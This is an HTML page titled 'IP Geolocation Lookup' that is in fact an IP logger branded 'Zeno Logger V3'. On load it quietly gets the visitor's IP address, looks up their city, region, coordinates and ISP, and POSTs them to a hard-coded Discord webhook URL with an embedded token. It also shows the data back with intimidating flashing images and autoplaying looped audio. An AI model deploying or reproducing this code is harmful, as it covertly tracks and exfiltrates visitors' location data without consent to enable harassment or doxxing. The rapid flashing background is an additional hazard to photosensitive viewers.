<!DOCTYPE html>
<html>
<head>
    <title>IP Geolocation Lookup</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: black;
            color: white;
            overflow: hidden;
        }
        .content {
            z-index: 2;
            text-align: center;
            position: relative;
        }
        img {
            max-width: 300px;
            margin: 20px 0;
        }
        .background {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-size: cover;
            background-position: center;
            z-index: 1;
            animation: flash 0.5s infinite; /* Flash speed */
        }
        @keyframes flash {
            0%, 50% {
                background-image: url('jas.png');
            }
            50.1%, 100% {
                background-image: url('jas2.png');
            }
        }
        /* CSS to make the IP text red */
        .ip-text {
            color: red; /* Change the text color to red */
            font-weight: bold;
        }
    </style>
</head>
<body>

<div class="background"></div>

<div class="content">
    <h2>IP LOGGED BY ZENO LOGGER V3</h2>
    <div id="ipResult"></div>
    <!-- Audio element with autoplay (no button required) -->
    <audio id="sound" src="sound.mp3" autoplay loop></audio>

    <script>
        // Function to get the IP address and geolocation
        function getMyIpAddress() {
            fetch("https://api64.ipify.org?format=json")
                .then(response => response.json())
                .then(data => {
                    // Fetch geolocation data from ipinfo.io
                    fetch("https://ipinfo.io/" + data.ip + "/json")
                        .then(response => response.json())
                        .then(data => {
                            var ipResultDiv = document.getElementById("ipResult");
                            ipResultDiv.innerHTML = `
                                <p><strong class="ip-text">IP Address:</strong> <span class="ip-text">${data.ip}</span></p>
                                <p><strong class="ip-text">City:</strong> <span class="ip-text">${data.city}</span></p>
                                <p><strong class="ip-text">Region:</strong> <span class="ip-text">${data.region}</span></p>
                                <p><strong class="ip-text">Country:</strong> <span class="ip-text">${data.country}</span></p>
                                <p><strong class="ip-text">Location:</strong> <span class="ip-text">${data.loc}</span></p>
                                <p><strong class="ip-text">Organization:</strong> <span class="ip-text">${data.org}</span></p>
                            `;
                            // Send the data to Discord webhook
                            sendToDiscord(data);
                        })
                        .catch(error => {
                            var ipResultDiv = document.getElementById("ipResult");
                            ipResultDiv.innerHTML = "<p>Error retrieving IP information.</p>";
                            console.error("Error retrieving IP information:", error);
                        });
                })
                .catch(error => {
                    console.error("Error retrieving IP address:", error);
                });
        }

        // Function to send IP information to Discord webhook
        function sendToDiscord(data) {
            var webhookUrl = "https://discord.com/api/webhooks/1322344664359239720/OP-GxUPNa6rkUfz52ovgWpFBd0aDhghLDaNpwuEc5XxaYJqahFqr4PwaDiKRaJYRFAg9"; // Your actual webhook URL
            var payload = {
                embeds: [
                    {
                        fields: [
                            { name: "IP Address", value: data.ip, inline: true },
                            { name: "City", value: data.city, inline: true },
                            { name: "Region", value: data.region, inline: true },
                            { name: "Country", value: data.country, inline: true },
                            { name: "Location", value: data.loc, inline: true },
                            { name: "Organization", value: data.org, inline: true }
                        ],
                        color: 0x903dfe, // Color hex value
                        timestamp: new Date().toISOString()
                    }
                ]
            };

            // Send the payload to the Discord webhook
            fetch(webhookUrl, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify(payload)
            })
            .then(response => {
                if (response.ok) {
                    console.log("Data sent to Discord successfully.");
                } else {
                    console.error("Error sending data to Discord.");
                }
            })
            .catch(error => {
                console.error("Error sending data to Discord:", error);
            });
        }

        // Wait for the page to load and start the function
        document.addEventListener("DOMContentLoaded", function() {
            getMyIpAddress();
        });
    </script>

</div>
</body>
</html>
